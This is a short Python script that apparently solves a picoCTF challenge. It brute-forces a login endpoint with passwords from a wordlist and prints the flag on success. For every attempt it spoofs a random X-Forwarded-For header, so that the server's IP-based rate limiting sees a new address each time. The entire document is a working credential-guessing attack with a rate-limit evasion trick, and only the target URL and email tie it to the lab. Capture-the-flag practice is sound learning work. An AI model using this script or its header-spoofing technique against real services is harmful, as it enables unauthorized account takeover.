import requests
import random

url = "http://amiable-citadel.picoctf.net:54370"

with open("passwords.txt", 'r') as f:
    passwords = f.read().split('\n')

def get_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

for idx, password in enumerate(passwords, start=1):
    print("Trying:", password, "|", f"{idx}/{len(passwords)}")

    headers = {
        'X-Forwarded-For': get_ip()
    }

    res = requests.post(f"{url}/login", json={ 'email': 'ctf-player@picoctf.org', 'password': password }, headers=headers)

    data = res.json()

    if data['success']:
        print(data['flag'])
        break